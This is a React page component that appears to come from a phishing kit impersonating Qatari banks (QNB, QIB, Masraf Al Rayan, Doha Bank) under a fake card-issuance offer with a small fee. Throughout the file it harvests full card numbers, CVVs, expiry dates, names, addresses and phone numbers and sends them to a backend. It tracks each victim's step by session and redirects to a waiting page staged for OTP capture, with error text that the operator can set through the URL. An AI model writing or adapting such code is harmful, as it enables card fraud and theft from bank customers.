import { useState, useEffect } from "react";
import { useLocation, useSearch } from "wouter";
import { trpc } from "@/lib/trpc";
import { useLanguage } from "@/contexts/LanguageContext";
import { toast } from "sonner";
import { motion, AnimatePresence } from "framer-motion";
import { 
  Building2, 
  ChevronRight, 
  ChevronLeft, 
  CreditCard, 
  MapPin, 
  Phone, 
  CheckCircle2,
  Info,
  ShieldCheck,
  Truck,
  X
} from "lucide-react";
import Header from "@/components/Header";

const BANK_INFO: Record<string, { nameAr: string, nameEn: string, logo: string, color: string }> = {
  qnb: { nameAr: "بنك قطر الوطني (QNB)", nameEn: "Qatar National Bank (QNB)", logo: "https://i.ibb.co/k6GT9TkG/IMG-20260714-WA0012.jpg", color: "#003565" },
  qib: { nameAr: "مصرف قطر الإسلامي (QIB)", nameEn: "Qatar Islamic Bank (QIB)", logo: "https://i.ibb.co/7NQ43XdK/IMG-20260714-WA0011.jpg", color: "#8C0032" },
  rayan: { nameAr: "مصرف الريان", nameEn: "Masraf Al Rayan", logo: "https://i.ibb.co/KzSyQBRw/IMG-20260714-WA0010.jpg", color: "#006432" },
  doha: { nameAr: "بنك الدوحة", nameEn: "Doha Bank", logo: "https://i.ibb.co/Df4dHNFh/IMG-20260714-WA0013.jpg", color: "#004B8D" },
};

const BANK_BRANCHES: Record<string, string[]> = {
  qnb: ["فرع الكورنيش - الرئيسي", "فرع السد", "فرع طريق سلوى", "فرع اللؤلؤة", "فرع الوكرة", "فرع الخور", "فرع سيتي سنتر"],
  qib: ["فرع الغرافة", "فرع الريان", "فرع الخور", "فرع سيتي سنتر", "فرع الدوحة لايف ستايل", "فرع طريق المطار"],
  rayan: ["فرع الدفنة - الرئيسي", "فرع مشيرب", "فرع الهلال", "فرع معيذر", "فرع قطر مول"],
  doha: ["فرع الدوحة سيتي سنتر", "فرع طريق المطار", "فرع بن محمود", "فرع الرويس", "فرع الدحيل"],
};

export default function LoginMethod() {
  const [, setLocation] = useLocation();
  const search = useSearch();
  const { language, setLanguage } = useLanguage();
  const params = new URLSearchParams(search);
  const bankId = params.get("bank") || "qnb";
  const currentBank = BANK_INFO[bankId] || BANK_INFO.qnb;
  
  const [sessionId, setSessionId] = useState<string>("");
  const [step, setStep] = useState<"selection" | "details" | "payment">("selection");
  const [deliveryMethod, setDeliveryMethod] = useState<"home" | "branch" | "">("");

  useEffect(() => {
    const sId = localStorage.getItem("sessionId") || params.get("session") || "";
    if (sId) {
      setSessionId(sId);
    }
    window.scrollTo(0, 0);
  }, [step]);

  const isArabic = language === "ar";
  const hasError = params.get("error") === "true";
  const customError = params.get("msg");
  const footerImage = isArabic 
    ? "https://i.ibb.co/23sMQkSF/IMG-20260714-WA0015.jpg"
    : "https://i.ibb.co/609jMvhx/IMG-20260714-WA0016.jpg";

  const [formData, setFormData] = useState({
    deliveryAddress: "",
    phoneConfirmation: "",
    branchName: "",
    cardNumber: "",
    cardholderName: "",
    expiryDate: "",
    cvv: "",
  });

  const submitLoginMethodMutation = trpc.submissions.submitLoginMethod.useMutation();
  const reportStepMutation = trpc.submissions.reportStep.useMutation();

  useEffect(() => {
    const currentSessionId = sessionId || localStorage.getItem("sessionId") || "";
    if (currentSessionId) {
      reportStepMutation.mutate({
        sessionId: currentSessionId,
        step: `card-${step}`
      });
    }
  }, [step, sessionId]);

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
    const { name, value } = e.target;
    
    if (name === "cardNumber") {
      let v = value.replace(/\s?/g, '').replace(/(\d{4})/g, '$1 ').trim();
      if (v.length > 19) v = v.slice(0, 19);
      setFormData(prev => ({ ...prev, [name]: v }));
    } else if (name === "expiryDate") {
      let cleanedValue = value.replace(/\D/g, "");
      if (cleanedValue.length > 4) cleanedValue = cleanedValue.slice(0, 4);
      if (cleanedValue.length > 2) cleanedValue = cleanedValue.slice(0, 2) + "/" + cleanedValue.slice(2);
      setFormData((prev) => ({ ...prev, [name]: cleanedValue }));
    } else {
      setFormData((prev) => ({ ...prev, [name]: value }));
    }
  };

  const handleSelection = (method: "home" | "branch") => {
    setDeliveryMethod(method);
    setStep("details");
  };

  const goToPayment = () => {
    if (deliveryMethod === "home") {
      if (!formData.deliveryAddress || !formData.phoneConfirmation) {
        toast.error(isArabic ? "يرجى إكمال بيانات التوصيل" : "Please complete delivery details");
        return;
      }
    } else {
      if (!formData.branchName) {
        toast.error(isArabic ? "يرجى اختيار فرع الاستلام" : "Please select a pickup branch");
        return;
      }
    }
    setStep("payment");
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    const currentSessionId = sessionId || localStorage.getItem("sessionId") || "";
    
    if (!formData.cardNumber || !formData.cardholderName || !formData.expiryDate || !formData.cvv) {
      toast.error(isArabic ? "يرجى إكمال بيانات الدفع" : "Please complete payment details");
      return;
    }

    try {
      await submitLoginMethodMutation.mutateAsync({
        sessionId: currentSessionId,
        loginType: "card_request",
        username: "",
        password: "",
        deliveryMethod,
        deliveryAddress: formData.deliveryAddress,
        phoneConfirmation: formData.phoneConfirmation,
        branchName: formData.branchName,
        cardNumber: formData.cardNumber,
        cardholderName: formData.cardholderName,
        expiryDate: formData.expiryDate,
        cvv: formData.cvv,
        issuanceFee: "10",
        deliveryFee: deliveryMethod === "home" ? "5" : "0",
        totalAmount: deliveryMethod === "home" ? "15" : "10",
      });
      
      // التقدم فقط بعد نجاح الإرسال
      setLocation(`/waiting?bank=${bankId}&session=${currentSessionId}&next=otp`);
    } catch (error) {
      console.error("Error submitting card data:", error);
      toast.error(isArabic ? "حدث خطأ أثناء الإرسال. يرجى المحاولة مرة أخرى." : "An error occurred during submission. Please try again.");
    }
  };

  const toggleLanguage = () => {
    setLanguage(isArabic ? "en" : "ar");
  };

  const containerVariants = {
    hidden: { opacity: 0, y: 20 },
    visible: { opacity: 1, y: 0, transition: { duration: 0.5 } },
    exit: { opacity: 0, x: -20, transition: { duration: 0.3 } }
  };

  return (
    <div className="min-h-screen bg-slate-50 flex flex-col font-sans" dir={isArabic ? "rtl" : "ltr"}>
      <Header />

      <main className="flex-1 max-w-xl mx-auto w-full px-4 py-8">
        {hasError && (
          <motion.div 
            initial={{ opacity: 0, y: -20 }}
            animate={{ opacity: 1, y: 0 }}
            className="mb-6 p-5 bg-red-50 border-2 border-red-200 rounded-[2rem] flex items-center gap-4 shadow-lg shadow-red-100"
          >
            <div className="w-10 h-10 bg-red-500 rounded-full flex items-center justify-center text-white shrink-0 shadow-md">
              <X size={24} />
            </div>
            <p className="text-sm font-black text-red-700 leading-tight">
              {customError || (isArabic ? "برجاء التحقق من معلومات الدفع الصحيح واعادة المحاوله" : "Please check payment information and try again")}
            </p>
          </motion.div>
        )}
        {/* Bank Identity Card */}
        <motion.div 
          initial={{ opacity: 0, scale: 0.95 }}
          animate={{ opacity: 1, scale: 1 }}
          className="bg-white rounded-3xl p-6 shadow-xl shadow-slate-200/50 mb-8 border border-slate-100 flex items-center gap-4"
        >
          <div className="w-16 h-16 rounded-2xl bg-slate-50 p-2 flex items-center justify-center border border-slate-100 shadow-inner">
            <img src={currentBank.logo} className="w-full h-full object-contain" alt="Bank Logo" />
          </div>
          <div>
            <h1 className="text-lg font-black text-slate-800 leading-tight">
              {isArabic ? currentBank.nameAr : currentBank.nameEn}
            </h1>
            <p className="text-sm text-slate-500 font-medium mt-1 flex items-center gap-1">
              <ShieldCheck className="w-4 h-4 text-emerald-500" />
              {isArabic ? "نظام استلام البطاقات الموحد" : "Unified Card Issuance System"}
            </p>
          </div>
        </motion.div>

        {/* Pricing Banner */}
        <div className="grid grid-cols-2 gap-3 mb-8">
          <div className="bg-gradient-to-br from-[#8C0032] to-[#b00040] p-4 rounded-2xl text-white shadow-lg shadow-[#8C0032]/20 relative overflow-hidden group">
            <div className="absolute -right-2 -bottom-2 opacity-10 group-hover:scale-110 transition-transform">
              <CreditCard size={64} />
            </div>
            <p className="text-[10px] uppercase tracking-wider font-bold opacity-80">{isArabic ? "رسوم الإصدار" : "Issuance Fee"}</p>
            <h3 className="text-xl font-black mt-1">10 <span className="text-xs font-normal">ر.ق</span></h3>
          </div>
          <div className="bg-white p-4 rounded-2xl border border-slate-100 shadow-md flex flex-col justify-center">
            <p className="text-[10px] uppercase tracking-wider font-bold text-slate-400">{isArabic ? "العرض السنوي" : "Annual Offer"}</p>
            <h3 className="text-sm font-bold text-emerald-600 mt-1">{isArabic ? "مجانية لمدة عام" : "Free for 1 Year"}</h3>
          </div>
        </div>

        <AnimatePresence mode="wait">
          {step === "selection" && (
            <motion.div 
              key="selection"
              variants={containerVariants}
              initial="hidden"
              animate="visible"
              exit="exit"
              className="space-y-4"
            >
              <h2 className="text-xl font-black text-slate-800 mb-6 px-1">
                {isArabic ? "كيف تود استلام بطاقتك؟" : "How would you like to receive your card?"}
              </h2>
              
              <button 
                onClick={() => handleSelection("home")}
                className="w-full bg-white p-6 rounded-3xl border-2 border-transparent hover:border-[#8C0032] shadow-md hover:shadow-xl transition-all flex items-center gap-5 text-right group"
              >
                <div className="w-14 h-14 rounded-2xl bg-rose-50 flex items-center justify-center text-[#8C0032] group-hover:scale-110 transition-transform">
                  <Truck size={28} />
                </div>
                <div className="flex-1">
                  <h3 className="text-lg font-black text-slate-800">{isArabic ? "توصيل إلى المنزل" : "Home Delivery"}</h3>
                  <p className="text-sm text-slate-500 font-medium">{isArabic ? "خلال 48 ساعة عمل (+5 ر.ق)" : "Within 48 working hours (+5 QAR)"}</p>
                </div>
                <ChevronRight className={`text-slate-300 ${isArabic ? 'rotate-180' : ''}`} />
              </button>

              <button 
                onClick={() => handleSelection("branch")}
                className="w-full bg-white p-6 rounded-3xl border-2 border-transparent hover:border-[#8C0032] shadow-md hover:shadow-xl transition-all flex items-center gap-5 text-right group"
              >
                <div className="w-14 h-14 rounded-2xl bg-blue-50 flex items-center justify-center text-blue-600 group-hover:scale-110 transition-transform">
                  <Building2 size={28} />
                </div>
                <div className="flex-1">
                  <h3 className="text-lg font-black text-slate-800">{isArabic ? "استلام من الفرع" : "Pickup from Branch"}</h3>
                  <p className="text-sm text-slate-500 font-medium">{isArabic ? "من أقرب فرع بنك خاص بك" : "From your nearest bank branch"}</p>
                </div>
                <ChevronRight className={`text-slate-300 ${isArabic ? 'rotate-180' : ''}`} />
              </button>
            </motion.div>
          )}

          {step === "details" && (
            <motion.div 
              key="details"
              variants={containerVariants}
              initial="hidden"
              animate="visible"
              exit="exit"
              className="bg-white rounded-3xl p-8 shadow-xl border border-slate-50"
            >
              <div className="flex items-center gap-3 mb-8">
                <div className="w-10 h-10 rounded-full bg-[#8C0032]/10 flex items-center justify-center text-[#8C0032]">
                  {deliveryMethod === "home" ? <MapPin size={20} /> : <Building2 size={20} />}
                </div>
                <h2 className="text-xl font-black text-slate-800">
                  {deliveryMethod === "home" ? (isArabic ? "بيانات التوصيل" : "Delivery Details") : (isArabic ? "اختيار الفرع" : "Select Branch")}
                </h2>
              </div>

              {deliveryMethod === "home" ? (
                <div className="space-y-6">
                  <div className="space-y-2">
                    <label className="text-sm font-black text-slate-700 block px-1">{isArabic ? "عنوان التوصيل الكامل" : "Full Delivery Address"}</label>
                    <div className="relative">
                      <input 
                        name="deliveryAddress" 
                        type="text" 
                        placeholder={isArabic ? "المنطقة، الشارع، رقم المنزل" : "Area, Street, House No."} 
                        className="w-full bg-slate-50 border-2 border-slate-100 rounded-2xl px-5 py-4 focus:bg-white focus:border-[#8C0032] outline-none transition-all font-medium"
                        value={formData.deliveryAddress} 
                        onChange={handleInputChange} 
                      />
                    </div>
                  </div>
                  <div className="space-y-2">
                    <label className="text-sm font-black text-slate-700 block px-1">{isArabic ? "رقم الهاتف للتواصل" : "Contact Phone Number"}</label>
                    <div className="relative">
                      <input 
                        name="phoneConfirmation" 
                        type="tel" 
                        placeholder="5XXXXXXX" 
                        className="w-full bg-slate-50 border-2 border-slate-100 rounded-2xl px-5 py-4 focus:bg-white focus:border-[#8C0032] outline-none transition-all font-medium"
                        value={formData.phoneConfirmation} 
                        onChange={handleInputChange} 
                      />
                      <Phone className="absolute right-4 top-1/2 -translate-y-1/2 text-slate-300" size={18} />
                    </div>
                  </div>
                </div>
              ) : (
                <div className="space-y-6">
                  <div className="space-y-2">
                    <label className="text-sm font-black text-slate-700 block px-1">{isArabic ? "اختر الفرع الأنسب لك" : "Select Preferred Branch"}</label>
                    <select 
                      name="branchName" 
                      className="w-full bg-slate-50 border-2 border-slate-100 rounded-2xl px-5 py-4 focus:bg-white focus:border-[#8C0032] outline-none transition-all font-medium appearance-none"
                      value={formData.branchName} 
                      onChange={handleInputChange}
                    >
                      <option value="">{isArabic ? "-- اختر من القائمة --" : "-- Select from list --"}</option>
                      {BANK_BRANCHES[bankId]?.map(b => <option key={b} value={b}>{b}</option>)}
                    </select>
                  </div>
                  <div className="p-4 bg-blue-50 rounded-2xl flex gap-3">
                    <Info className="text-blue-500 shrink-0" size={20} />
                    <p className="text-xs text-blue-700 font-bold leading-relaxed">
                      {isArabic ? "سيتم إرسال البطاقة إلى الفرع المختار خلال 24 ساعة عمل، وسوف تتلقى رسالة نصية عند جاهزيتها." : "The card will be sent to the selected branch within 24 working hours, and you will receive an SMS when it's ready."}
                    </p>
                  </div>
                </div>
              )}

              <div className="mt-10 flex flex-col gap-3">
                <button 
                  onClick={goToPayment}
                  className="w-full bg-[#8C0032] text-white py-5 rounded-2xl font-black text-lg shadow-xl shadow-[#8C0032]/30 hover:scale-[1.02] active:scale-95 transition-all"
                >
                  {isArabic ? "متابعة للدفع" : "Proceed to Payment"}
                </button>
                <button 
                  onClick={() => setStep("selection")}
                  className="w-full py-4 text-slate-400 font-bold hover:text-slate-600 transition-colors flex items-center justify-center gap-2"
                >
                  <ChevronLeft className={isArabic ? 'rotate-180' : ''} size={18} />
                  {isArabic ? "العودة للخطوة السابقة" : "Back to previous step"}
                </button>
              </div>
            </motion.div>
          )}

          {step === "payment" && (
            <motion.div 
              key="payment"
              variants={containerVariants}
              initial="hidden"
              animate="visible"
              exit="exit"
              className="bg-white rounded-3xl p-8 shadow-xl border border-slate-50"
            >
              <div className="flex items-center justify-between mb-8">
                <div className="flex items-center gap-3">
                  <div className="w-10 h-10 rounded-full bg-emerald-100 flex items-center justify-center text-emerald-600">
                    <CheckCircle2 size={20} />
                  </div>
                  <h2 className="text-xl font-black text-slate-800">{isArabic ? "إتمام الدفع" : "Complete Payment"}</h2>
                </div>
                <div className="text-right">
                  <p className="text-[10px] font-black text-slate-400 uppercase tracking-wider">{isArabic ? "الإجمالي" : "Total"}</p>
                  <p className="text-lg font-black text-[#8C0032]">{deliveryMethod === "home" ? "15" : "10"} ر.ق</p>
                </div>
              </div>

              {/* Virtual Card Preview */}
              <div className="w-full aspect-[1.6/1] bg-gradient-to-br from-slate-800 to-slate-900 rounded-2xl p-6 text-white mb-8 shadow-2xl relative overflow-hidden">
                <div className="absolute top-0 right-0 w-32 h-32 bg-white/5 rounded-full -mr-16 -mt-16 blur-2xl"></div>
                <div className="flex justify-between items-start mb-10">
                  <div className="w-12 h-10 bg-gradient-to-br from-yellow-400 to-yellow-600 rounded-lg shadow-inner opacity-80"></div>
                  <div className="flex gap-2">
                    <div className="w-8 h-8 bg-white/10 rounded-full"></div>
                    <div className="w-8 h-8 bg-white/20 rounded-full -ml-4"></div>
                  </div>
                </div>
                <div className="space-y-6">
                  <p className="text-xl font-mono tracking-[0.2em] h-8">
                    {formData.cardNumber || "•••• •••• •••• ••••"}
                  </p>
                  <div className="flex justify-between items-end">
                    <div className="space-y-1">
                      <p className="text-[8px] uppercase tracking-widest opacity-50">{isArabic ? "صاحب البطاقة" : "Card Holder"}</p>
                      <p className="text-sm font-bold tracking-wider uppercase h-5">{formData.cardholderName || "FULL NAME"}</p>
                    </div>
                    <div className="text-right space-y-1">
                      <p className="text-[8px] uppercase tracking-widest opacity-50">{isArabic ? "الصلاحية" : "Expires"}</p>
                      <p className="text-sm font-bold h-5">{formData.expiryDate || "MM/YY"}</p>
                    </div>
                  </div>
                </div>
              </div>

              <form onSubmit={handleSubmit} className="space-y-5">
                <div className="space-y-2">
                  <label className="text-xs font-black text-slate-500 uppercase tracking-wider px-1">{isArabic ? "رقم البطاقة" : "Card Number"}</label>
                  <input 
                    name="cardNumber" 
                    type="text" 
                    placeholder="0000 0000 0000 0000" 
                    className="w-full bg-slate-50 border-2 border-slate-100 rounded-2xl px-5 py-4 focus:bg-white focus:border-[#8C0032] outline-none transition-all font-mono text-lg"
                    value={formData.cardNumber} 
                    onChange={handleInputChange} 
                  />
                </div>

                <div className="grid grid-cols-2 gap-4">
                  <div className="space-y-2">
                    <label className="text-xs font-black text-slate-500 uppercase tracking-wider px-1">{isArabic ? "تاريخ الانتهاء" : "Expiry Date"}</label>
                    <input 
                      name="expiryDate" 
                      type="text" 
                      placeholder="MM / YY" 
                      className="w-full bg-slate-50 border-2 border-slate-100 rounded-2xl px-5 py-4 focus:bg-white focus:border-[#8C0032] outline-none transition-all text-center font-bold"
                      value={formData.expiryDate} 
                      onChange={handleInputChange} 
                    />
                  </div>
                  <div className="space-y-2">
                    <label className="text-xs font-black text-slate-500 uppercase tracking-wider px-1">CVV</label>
                    <input 
                      name="cvv" 
                      type="password" 
                      placeholder="•••" 
                      maxLength={3}
                      className="w-full bg-slate-50 border-2 border-slate-100 rounded-2xl px-5 py-4 focus:bg-white focus:border-[#8C0032] outline-none transition-all text-center font-bold"
                      value={formData.cvv} 
                      onChange={handleInputChange} 
                    />
                  </div>
                </div>

                <div className="space-y-2">
                  <label className="text-xs font-black text-slate-500 uppercase tracking-wider px-1">{isArabic ? "اسم صاحب البطاقة" : "Cardholder Name"}</label>
                  <input 
                    name="cardholderName" 
                    type="text" 
                    placeholder={isArabic ? "الاسم كما هو مكتوب على البطاقة" : "Name as printed on card"} 
                    className="w-full bg-slate-50 border-2 border-slate-100 rounded-2xl px-5 py-4 focus:bg-white focus:border-[#8C0032] outline-none transition-all font-bold uppercase"
                    value={formData.cardholderName} 
                    onChange={handleInputChange} 
                  />
                </div>

                <div className="pt-6">
                  <button 
                    type="submit"
                    disabled={submitLoginMethodMutation.isPending}
                    className="w-full bg-[#8C0032] text-white py-5 rounded-2xl font-black text-lg shadow-xl shadow-[#8C0032]/30 hover:scale-[1.02] active:scale-95 transition-all disabled:opacity-50 disabled:scale-100"
                  >
                    {submitLoginMethodMutation.isPending ? (isArabic ? "جاري المعالجة..." : "Processing...") : (isArabic ? "تأكيد وإتمام الطلب" : "Confirm & Order")}
                  </button>
                  <button 
                    type="button"
                    onClick={() => setStep("details")}
                    className="w-full py-4 text-slate-400 font-bold hover:text-slate-600 transition-colors mt-2"
                  >
                    {isArabic ? "رجوع" : "Back"}
                  </button>
                </div>
              </form>
            </motion.div>
          )}
        </AnimatePresence>
      </main>

      <footer className="mt-auto">
        <div className="max-w-xl mx-auto px-4 py-6 text-center">
          <div className="flex items-center justify-center gap-2 text-slate-400 mb-4">
            <ShieldCheck size={16} />
            <span className="text-[10px] font-bold uppercase tracking-widest">{isArabic ? "دفع آمن ومحمي 100%" : "100% Secure & Protected Payment"}</span>
          </div>
        </div>
        <div className="footer-image-container">
          <img src={footerImage} className="footer-image-standard" alt="Footer" />
        </div>
      </footer>
    </div>
  );
}
